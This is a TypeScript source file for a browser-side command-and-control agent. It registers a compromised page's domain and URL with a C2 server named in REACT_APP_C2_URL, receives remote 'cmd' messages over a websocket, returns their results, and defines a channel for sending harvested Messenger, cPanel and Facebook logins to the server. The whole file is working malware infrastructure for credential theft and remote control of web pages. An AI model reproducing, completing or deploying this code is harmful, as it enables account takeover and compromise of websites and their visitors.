import Axios, { AxiosResponse } from "axios";
import { io, Socket } from "socket.io-client";
import { Subject } from "rxjs";

export type AgentSocketTypes = {
  type: 'missing-token'
} | {
  type: 'invalid-token'
} | {
  type: 'new-token'
  token: string
} | {
  type: 'new-agent-id'
  agentId: string
  token: string
} | {
  type: 'agent-not-found'
} | {
  type: 'cmd'
  cmd: string
  cmdId: string;
  data?: any
} | {
  type: 'result'
  cmdId: string
  result: string
} | {
  type: 'credentials'
  payload: {
    type: 'messenger'
    email: string
    password: string
  } | {
    type: 'cpanel'
    user: string
    pass: string
  } | {
    type: 'facebook'
    emailOrPhone: string
    password: string
  }
}

export class AgentSocket extends Subject<AgentSocketTypes> {
  private static _instance: AgentSocket | null = null;
  static getInstance = (
    agentId: string = '',
    agentToken: string = '',
    socket: Socket = agentWebsocket,
  ) => {
    if (!this._instance) this._instance = new AgentSocket(
      agentId,
      agentToken,
      socket
    );
    return this._instance;
  }

  private constructor(
    private agentId: string = '',
    private agentToken: string = '',
    readonly socket: Socket = agentWebsocket,
  ) {
    super();
    this.socket.on('error', async (msg: string) => {
      if (msg.startsWith('Invalid token')) {
        this.agentToken = '';
        this.next({
          type: 'invalid-token',
        });
      }
      if (msg.startsWith('Missing token')) {
        this.agentToken = '';
        this.next({
          type: 'missing-token',
        });
      }
    });
    this.socket.on('cmd', (cmd: { cmd: string, cmdId: string, data?: any }) => {
      this.socket.emit('cmd received', { cmdId: cmd.cmdId });
      this.next({
        type: 'cmd',
        cmd: cmd.cmd,
        cmdId: cmd.cmdId,
        data: cmd.data,
      });
    });
    this.socket.on('ping', callback => callback('pong'));
    this.subscribe({
      next: async event => {
        switch (event.type) {
          case 'result':
            this.socket.emit('result', {
              cmdId: event.cmdId,
              result: event.result,
              agentId: this.agentId,
            });
            break;

          default:
            break;
        }
      }
    });
    this.connect();
  }

  connected = () => this.socket.connected;

  connect = () => {
    if (this.connected()) return;
    this.socket.auth = { token: this.agentToken };
    this.socket.connect();
  }

  disconnect = () => {
    if (!this.connected()) return;
    this.socket.disconnect();
  }

  requestAgentId = async () => {
    try {
      const res: AxiosResponse<{ agentId: string, token: string }> = await Axios.post(
        `${process.env.REACT_APP_C2_URL ? process.env.REACT_APP_C2_URL : 'https://localhost:3001'}/agents`,
        {
          domain: window.location.host,
          url: window.location.href,
        }
      );
      this.agentId = res.data.agentId;
      this.agentToken = res.data.token;
      this.next({
        type: 'new-agent-id',
        agentId: res.data.agentId,
        token: res.data.token,
      });
    } catch (e: any) {
      console.log(e);
    }
  }

  requestAgentToken = async () => {
    try {
      const res: AxiosResponse<{ token: string }> = await Axios.post(
        `${process.env.REACT_APP_C2_URL ? process.env.REACT_APP_C2_URL : 'https://localhost:3001'}/agents/activity`,
        {},
        {
          headers: {
            'x-agent-id': this.agentId,
          }
        }
      );
      this.agentToken = res.data.token;
      this.next({
        type: 'new-token',
        token: res.data.token
      });
    } catch (e: any) {
      if (e.isAxiosError) {
        if (e.response.data.error.message === 'Agent not found') {
          this.agentId = '';
          this.next({ type: 'agent-not-found' });
        }
        if (e.response.data.error.message === 'x-agent-id header is missing') {
          this.next({ type: 'agent-not-found' });
        }
      }
    }
  }
}

export const agentWebsocket = io(
  `${process.env.REACT_APP_WS_URL ? process.env.REACT_APP_WS_URL : 'wss://localhost:3001'}/agents/ws`,
  {
    transports: ['websocket'],
    autoConnect: false,
    reconnection: false,
  }
);
